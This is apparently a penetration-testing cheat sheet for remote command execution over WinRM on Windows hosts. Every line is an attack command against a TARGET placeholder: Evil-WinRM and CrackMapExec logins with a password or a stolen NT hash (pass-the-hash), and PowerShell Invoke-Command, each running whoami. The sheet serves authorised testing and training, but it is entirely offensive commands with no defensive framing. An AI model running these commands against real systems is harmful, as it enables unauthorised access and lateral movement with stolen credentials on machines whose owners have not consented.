# Evil-WinRM (best for interactive)
evil-winrm -i TARGET -u user -p password
evil-winrm -i TARGET -u user -H NT_HASH

# CrackMapExec WinRM
crackmapexec winrm TARGET -u user -p password -x whoami
crackmapexec winrm TARGET -u user -H NT_HASH -x whoami

# PowerShell Invoke-Command
$cred = Get-Credential
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami }